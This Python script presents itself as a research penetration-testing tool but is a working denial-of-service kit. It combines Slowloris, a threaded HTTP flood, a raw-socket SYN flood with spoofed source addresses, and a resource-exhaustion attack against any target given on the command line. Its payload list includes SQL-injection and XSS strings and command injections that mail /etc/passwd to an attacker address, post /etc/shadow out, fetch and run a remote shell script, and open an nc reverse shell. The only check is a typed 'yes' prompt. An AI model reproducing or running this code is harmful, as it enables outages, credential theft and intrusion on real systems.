import requests
import threading
import time
import random
import json
import hashlib
import socket
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
from datetime import datetime
import sys
import urllib3
from fake_useragent import UserAgent
import base64
import secrets
import struct
import zlib
import gzip
from io import BytesIO

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ExtremePenetrationTester:
    def __init__(self):
        self.results = []
        self.ua = UserAgent()
        self.attack_stats = {
            'requests_sent': 0,
            'successful_attacks': 0,
            'server_errors': 0,
            'start_time': None
        }
        
    def generate_malicious_payloads(self):
        """Generate extreme payloads untuk testing"""
        payloads = {
            # SQL Injection Extreme
            'sql_injection': [
                "' OR '1'='1' --",
                "' UNION SELECT 1,2,3,4,5 --",
                "' AND (SELECT * FROM (SELECT(SLEEP(10)))a) --",
                "' OR BENCHMARK(5000000,MD5('test')) --",
                "' OR 1=1; EXEC xp_cmdshell('format c:') --"
            ],
            # XSS Extreme
            'xss': [
                "<script>while(true){alert('XSS')}</script>",
                "<img src=x onerror=\"javascript:while(true){window.open('http://malicious.com')}\">",
                "<body onload=\"document.body.innerHTML='<iframe src=http://malicious.com></iframe>'\">"
            ],
            # Buffer Overflow Extreme
            'buffer_overflow': [
                "A" * 100000,  # 100KB payload
                "A" * 500000,  # 500KB payload  
                "A" * 1000000, # 1MB payload
                "%n" * 10000,  # Format string
                "\x00" * 50000 # Null bytes
            ],
            # Command Injection Extreme
            'command_injection': [
                "; cat /etc/passwd | mail attacker@evil.com",
                "| wget http://malicious.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
                "&& curl -X POST -d @/etc/shadow http://attacker.com/steal",
                "; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 >/tmp/f"
            ]
        }
        return payloads

    def create_slowloris_attack(self, target_host, target_port=80, sockets_count=500):
        """Slowloris DDoS Attack"""
        print(f"🐌 Starting Slowloris attack on {target_host}:{target_port}")
        
        sockets = []
        
        # Create multiple partial connections
        for i in range(sockets_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_host, target_port))
                
                # Send partial HTTP request
                s.send(f"POST / HTTP/1.1\r\nHost: {target_host}\r\n".encode())
                s.send(f"User-Agent: {self.ua.random}\r\n".encode())
                s.send(f"Content-Length: 1000000\r\n".encode())
                
                sockets.append(s)
                print(f"🔧 Slowloris socket {i+1} connected")
                
            except Exception as e:
                print(f"❌ Socket {i+1} failed: {e}")
        
        # Keep connections alive
        print("🕐 Keeping connections alive...")
        time.sleep(300)  # Keep for 5 minutes
        
        # Cleanup
        for s in sockets:
            try:
                s.close()
            except:
                pass

    def create_http_flood(self, url, num_requests=10000, num_threads=100):
        """High-speed HTTP Flood Attack"""
        print(f"🌊 Starting HTTP Flood: {num_requests} requests with {num_threads} threads")
        
        session = requests.Session()
        session.verify = False
        
        def flood_worker(worker_id):
            local_count = 0
            for i in range(num_requests // num_threads):
                try:
                    # Generate malicious payload
                    payloads = self.generate_malicious_payloads()
                    random_payload = random.choice(
                        payloads['sql_injection'] + 
                        payloads['xss'] + 
                        payloads['buffer_overflow']
                    )
                    
                    headers = {
                        'User-Agent': self.ua.random,
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive'
                    }
                    
                    # Randomly choose attack type
                    attack_type = random.choice(['get', 'post', 'head'])
                    
                    if attack_type == 'get':
                        response = session.get(
                            f"{url}?q={random_payload}&cache={random.randint(100000,999999)}",
                            headers=headers,
                            timeout=5
                        )
                    elif attack_type == 'post':
                        response = session.post(
                            url,
                            data={'data': random_payload, 'test': 'x' * 10000},
                            headers=headers,
                            timeout=5
                        )
                    else:  # head
                        response = session.head(url, headers=headers, timeout=5)
                    
                    local_count += 1
                    self.attack_stats['requests_sent'] += 1
                    
                    if response.status_code >= 500:
                        self.attack_stats['server_errors'] += 1
                        print(f"💥 Server error: {response.status_code}")
                    
                    if local_count % 50 == 0:
                        print(f"📦 Worker {worker_id}: Sent {local_count} requests")
                        
                except Exception as e:
                    if "Max retries" in str(e) or "Connection" in str(e):
                        self.attack_stats['server_errors'] += 1
                        print(f"🎯 Possible server overload: {e}")
        
        # Start all threads
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(flood_worker, i) for i in range(num_threads)]
            
            for future in as_completed(futures):
                future.result()

    def create_tcp_syn_flood(self, target_ip, target_port=80, duration=60):
        """TCP SYN Flood Attack"""
        print(f"🌪️ Starting TCP SYN Flood on {target_ip}:{target_port} for {duration}s")
        
        # Create IP header
        def create_ip_header(source_ip, dest_ip):
            version_ihl = 69  # Version 4, IHL 5
            type_of_service = 0
            total_length = 40  # IP header + TCP header
            identification = random.randint(1, 65535)
            flags_fragment = 0
            ttl = 255
            protocol = 6  # TCP
            checksum = 0
            
            source_ip_bytes = socket.inet_aton(source_ip)
            dest_ip_bytes = socket.inet_aton(dest_ip)
            
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                  version_ihl, type_of_service, total_length,
                                  identification, flags_fragment, ttl, protocol,
                                  checksum, source_ip_bytes, dest_ip_bytes)
            return ip_header

        # Create TCP header
        def create_tcp_header(source_port, dest_port, seq_num, ack_num, window=5840):
            data_offset_reserved = 80  # Data offset 5, reserved 0
            flags = 2  # SYN flag
            checksum = 0
            urg_ptr = 0
            
            tcp_header = struct.pack('!HHLLBBHHH',
                                   source_port, dest_port, seq_num, ack_num,
                                   data_offset_reserved, flags, window,
                                   checksum, urg_ptr)
            return tcp_header

        end_time = time.time() + duration
        packet_count = 0
        
        # Create raw socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            print("❌ Need root privileges for raw socket")
            return

        while time.time() < end_time:
            try:
                # Generate random source IP and port
                source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                source_port = random.randint(1024, 65535)
                
                ip_header = create_ip_header(source_ip, target_ip)
                tcp_header = create_tcp_header(source_port, target_port, random.randint(1, 4294967295), 0)
                
                packet = ip_header + tcp_header
                s.sendto(packet, (target_ip, 0))
                
                packet_count += 1
                
                if packet_count % 1000 == 0:
                    print(f"📦 SYN packets sent: {packet_count}")
                    
            except Exception as e:
                print(f"❌ SYN flood error: {e}")
                break
        
        print(f"✅ SYN Flood completed: {packet_count} packets sent")

    def create_resource_exhaustion(self, url, num_threads=50):
        """Resource Exhaustion Attack"""
        print(f"💀 Starting Resource Exhaustion Attack")
        
        def exhaust_worker(worker_id):
            session = requests.Session()
            session.verify = False
            
            while True:
                try:
                    # Send large files
                    large_data = 'x' * random.randint(100000, 500000)  # 100KB-500KB
                    
                    # Multiple concurrent large requests
                    headers = {
                        'User-Agent': self.ua.random,
                        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW',
                        'Content-Length': str(len(large_data) + 200)
                    }
                    
                    response = session.post(
                        url,
                        data=large_data,
                        headers=headers,
                        timeout=30
                    )
                    
                    self.attack_stats['requests_sent'] += 1
                    
                    print(f"📦 Worker {worker_id}: Sent large payload")
                    
                except Exception as e:
                    print(f"💥 Worker {worker_id}: {e}")
        
        # Start exhaustion threads
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(target=exhaust_worker, args=(i+1,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # Run for 10 minutes
        time.sleep(600)
        
        print("✅ Resource exhaustion completed")

    def run_comprehensive_attack(self, target_url, attack_duration=300):
        """Run all attacks simultaneously"""
        print(f"🎯 Starting Comprehensive Penetration Test")
        print(f"⏰ Duration: {attack_duration} seconds")
        print(f"🎯 Target: {target_url}")
        print("=" * 60)
        
        self.attack_stats['start_time'] = time.time()
        
        # Parse target
        if '://' in target_url:
            target_host = target_url.split('://')[1].split('/')[0]
        else:
            target_host = target_url.split('/')[0]
        
        target_port = 80
        if ':' in target_host:
            target_host, target_port = target_host.split(':')
            target_port = int(target_port)
        
        # Start all attacks in separate threads
        attack_threads = []
        
        # HTTP Flood
        http_thread = threading.Thread(
            target=self.create_http_flood, 
            args=(target_url, 50000, 200)
        )
        attack_threads.append(http_thread)
        
        # TCP SYN Flood
        syn_thread = threading.Thread(
            target=self.create_tcp_syn_flood,
            args=(target_host, target_port, attack_duration)
        )
        attack_threads.append(syn_thread)
        
        # Resource Exhaustion
        resource_thread = threading.Thread(
            target=self.create_resource_exhaustion,
            args=(target_url, 100)
        )
        attack_threads.append(resource_thread)
        
        # Start all attacks
        for thread in attack_threads:
            thread.daemon = True
            thread.start()
        
        # Monitor progress
        start_time = time.time()
        while time.time() - start_time < attack_duration:
            elapsed = time.time() - start_time
            remaining = attack_duration - elapsed
            
            print(f"⏱️  Elapsed: {elapsed:.1f}s | Remaining: {remaining:.1f}s | "
                  f"Requests: {self.attack_stats['requests_sent']} | "
                  f"Server Errors: {self.attack_stats['server_errors']}")
            
            time.sleep(5)
        
        print("=" * 60)
        print("🎯 PENETRATION TEST COMPLETED")
        print(f"📊 Total Requests Sent: {self.attack_stats['requests_sent']}")
        print(f"💥 Server Errors: {self.attack_stats['server_errors']}")
        print(f"⏱️  Total Duration: {time.time() - self.attack_stats['start_time']:.1f}s")
        
        # Effectiveness analysis
        error_rate = (self.attack_stats['server_errors'] / max(1, self.attack_stats['requests_sent'])) * 100
        print(f"📈 Server Error Rate: {error_rate:.2f}%")
        
        if error_rate > 50:
            print("🎯 RESULT: HIGH IMPACT - Server likely overwhelmed")
        elif error_rate > 20:
            print("🎯 RESULT: MEDIUM IMPACT - Server showing stress")
        else:
            print("🎯 RESULT: LOW IMPACT - Server handling load well")

def main():
    parser = argparse.ArgumentParser(description='🔥 Extreme Penetration Testing Tool - RESEARCH ONLY')
    parser.add_argument('target', help='Target URL or IP address')
    parser.add_argument('-d', '--duration', type=int, default=300, 
                       help='Attack duration in seconds (default: 300)')
    parser.add_argument('--mode', choices=['http_flood', 'syn_flood', 'slowloris', 'comprehensive'], 
                       default='comprehensive', help='Attack mode')
    
    args = parser.parse_args()
    
    # WARNING
    print("🚨 WARNING: This tool is for RESEARCH and AUTHORIZED TESTING ONLY!")
    print("🚨 Illegal use is strictly prohibited!")
    print("🚨 You are responsible for complying with all applicable laws!")
    
    confirm = input("❓ Do you have authorization to test this target? (yes/NO): ")
    if confirm.lower() != 'yes':
        print("❌ Operation cancelled")
        return
    
    tester = ExtremePenetrationTester()
    
    try:
        if args.mode == 'http_flood':
            tester.create_http_flood(args.target, 10000, 100)
        elif args.mode == 'syn_flood':
            target_host = args.target.split('://')[1] if '://' in args.target else args.target
            tester.create_tcp_syn_flood(target_host, 80, args.duration)
        elif args.mode == 'slowloris':
            target_host = args.target.split('://')[1] if '://' in args.target else args.target
            tester.create_slowloris_attack(target_host, 80, 500)
        else:
            tester.run_comprehensive_attack(args.target, args.duration)
            
    except KeyboardInterrupt:
        print("\n🛑 Attack stopped by user")
    except Exception as e:
        print(f"💥 Critical error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    # Required: Run with administrator privileges
    # pip install requests fake-useragent urllib3
    
    main()